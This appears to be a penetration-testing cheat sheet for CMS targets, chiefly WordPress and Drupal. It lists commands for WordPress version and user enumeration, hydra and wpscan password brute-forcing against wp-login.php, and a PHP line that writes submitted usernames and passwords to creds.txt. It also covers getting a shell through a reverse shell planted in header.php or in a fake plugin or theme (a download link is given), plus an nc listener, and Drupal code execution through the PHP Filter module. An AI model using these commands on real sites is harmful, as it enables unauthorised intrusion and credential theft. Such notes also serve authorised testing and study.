# CMS

## Drupal

### PHP Code Execution
- Enable​ PHP Filter​ module on the ​ Modules​
- Add content​ then to ​ Article
- Pasting PHP into the article body
- Changing the ​ Text format​ to ​PHP code​
- Clicking on ​ Preview​

### Tools
- [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

## Wordpress
Version discovery

```
curl -s 192.168.56.102/wordpress/ | grep generator
curl -s 192.168.56.102/wordpress/readme.html | grep Version
curl -s 192.168.56.102/wordpress/wp-login.php | grep "ver="
```

User enumeration

```
for i in $(seq 1 5); do curl -sL 192.168.110.105/wordpress/?author=$i | grep '<title>'; done

// When 'stop-user-enumeration' plugin installed
curl -i -sL '192.168.56.102/wordpress/?wp-comments-post&author=1' | grep '<title>'
curl -sL 192.168.56.102/wordpress/?wp-comments-post -d author=1 | grep '<title>'

// Rest API (4.7+)
curl -s http://localhost/wp-json/wp/v2/users
```

Theme and plugin enumeration

```
/wordpress_site/wp-content/plugins/ and the /wordpress_site/wp-content/themes/

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192.168.56.104/wordpress/FUZZ

nmap -sV -p 80 192.168.56.102 --script=http-wordpress-enum.nse --script-args=http-wordpress-enum.root=/wordpress/
```

Enumerate users, plugins and themes

```
wpscan -u http://192.168.110.105/wordpress/ -e u,ap,at
```

Password brute-force 

```
echo admin > users.txt && echo wpuser >> users.txt

hydra -L users.txt -P lists/500.txt -e nsr 192.168.110.105 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Location"

wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/
```

Privilege escalations 

```
searchsploit wordpress escalation
```

Log passwords from wp-login.php

```
file_put_contents("creds.txt",$_POST['log']." - ".$_POST['pwd'])
```

Obtain shell

- Editing the main header.php script of the WordPress site to contain a reverse shell.
- Uploading a fake plugin containing a reverse shell.
- Uploading a fake theme containing a reverse shell. [http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip](http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip)

```
nc -lvp 31337
curl 192.168.56.102/wordpress/wp-content/themes/fake-theme/header.php
```



### Tools

- [WPScan - https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
- [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)
- [wpBullet - Static code analysis for WordPress Plugins/Themes](https://github.com/webarx-security/wpbullet)

## Joomla

### Tools
- [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

## Moodle

### Tools
- [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

## SilverStripe

### Tools
- [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)
